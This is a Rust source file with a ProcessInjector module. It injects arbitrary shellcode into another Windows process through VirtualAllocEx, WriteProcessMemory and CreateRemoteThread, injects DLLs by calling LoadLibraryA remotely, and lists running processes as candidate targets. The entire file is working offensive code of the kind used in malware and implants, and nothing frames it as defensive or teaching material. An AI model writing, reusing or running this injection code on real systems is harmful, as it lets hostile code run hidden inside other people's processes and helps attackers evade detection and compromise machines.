use log::{info, error};

pub struct ProcessInjector;

impl ProcessInjector {
    #[cfg(target_os = "windows")]
    pub fn inject_shellcode(pid: u32, shellcode: &[u8]) -> Result<String, String> {
        use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread};
        use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};
        use winapi::um::handleapi::CloseHandle;
        use std::ptr;

        unsafe {
            let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
            if h_process.is_null() {
                return Err(format!("OpenProcess failed for PID {}", pid));
            }

            let remote_mem = VirtualAllocEx(
                h_process,
                ptr::null_mut(),
                shellcode.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );
            if remote_mem.is_null() {
                CloseHandle(h_process);
                return Err("VirtualAllocEx failed".to_string());
            }

            let mut bytes_written = 0;
            let write_ok = WriteProcessMemory(
                h_process,
                remote_mem,
                shellcode.as_ptr() as *const _,
                shellcode.len(),
                &mut bytes_written,
            );
            if write_ok == 0 {
                CloseHandle(h_process);
                return Err("WriteProcessMemory failed".to_string());
            }

            let mut thread_id: u32 = 0;
            let h_thread = CreateRemoteThread(
                h_process,
                ptr::null_mut(),
                0,
                Some(std::mem::transmute(remote_mem)),
                ptr::null_mut(),
                0,
                &mut thread_id,
            );
            if h_thread.is_null() {
                CloseHandle(h_process);
                return Err("CreateRemoteThread failed".to_string());
            }

            info!("Shellcode injected into PID {} (thread {})", pid, thread_id);
            CloseHandle(h_thread);
            CloseHandle(h_process);
            Ok(format!("Shellcode injected into PID {} — thread ID {}, {} bytes written", pid, thread_id, bytes_written))
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn inject_shellcode(_pid: u32, _shellcode: &[u8]) -> Result<String, String> {
        Err("Process injection only supported on Windows".to_string())
    }

    #[cfg(target_os = "windows")]
    pub fn inject_dll(pid: u32, dll_path: &str) -> Result<String, String> {
        use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread};
        use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PROCESS_ALL_ACCESS};
        use winapi::um::handleapi::CloseHandle;
        use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
        use std::ffi::CString;
        use std::ptr;

        unsafe {
            let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
            if h_process.is_null() {
                return Err(format!("OpenProcess failed for PID {}", pid));
            }

            let dll_path_c = CString::new(dll_path).map_err(|_| "Invalid DLL path")?;
            let path_bytes = dll_path_c.as_bytes_with_nul();

            let remote_mem = VirtualAllocEx(
                h_process,
                ptr::null_mut(),
                path_bytes.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            if remote_mem.is_null() {
                CloseHandle(h_process);
                return Err("VirtualAllocEx failed".to_string());
            }

            let mut bytes_written = 0;
            let write_ok = WriteProcessMemory(
                h_process,
                remote_mem,
                path_bytes.as_ptr() as *const _,
                path_bytes.len(),
                &mut bytes_written,
            );
            if write_ok == 0 {
                CloseHandle(h_process);
                return Err("WriteProcessMemory failed".to_string());
            }

            let kernel32 = CString::new("kernel32.dll").unwrap();
            let h_kernel32 = GetModuleHandleA(kernel32.as_ptr());
            if h_kernel32.is_null() {
                CloseHandle(h_process);
                return Err("GetModuleHandleA(kernel32) failed".to_string());
            }

            let load_library = CString::new("LoadLibraryA").unwrap();
            let fn_load_library = GetProcAddress(h_kernel32, load_library.as_ptr());
            if fn_load_library.is_null() {
                CloseHandle(h_process);
                return Err("GetProcAddress(LoadLibraryA) failed".to_string());
            }

            let mut thread_id: u32 = 0;
            let h_thread = CreateRemoteThread(
                h_process,
                ptr::null_mut(),
                0,
                Some(std::mem::transmute(fn_load_library)),
                remote_mem,
                0,
                &mut thread_id,
            );
            if h_thread.is_null() {
                CloseHandle(h_process);
                return Err("CreateRemoteThread failed".to_string());
            }

            info!("DLL '{}' injected into PID {} (thread {})", dll_path, pid, thread_id);
            CloseHandle(h_thread);
            CloseHandle(h_process);
            Ok(format!("DLL '{}' injected into PID {} — thread ID {}", dll_path, pid, thread_id))
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn inject_dll(_pid: u32, _dll_path: &str) -> Result<String, String> {
        Err("DLL injection only supported on Windows".to_string())
    }

    pub fn list_injectable() -> Vec<(u32, String)> {
        use sysinfo::{System, SystemExt, ProcessExt, PidExt};
        let mut sys = System::new_all();
        sys.refresh_all();
        sys.processes().iter()
            .map(|(pid, proc_info)| (pid.as_u32(), proc_info.name().to_string()))
            .collect()
    }
}
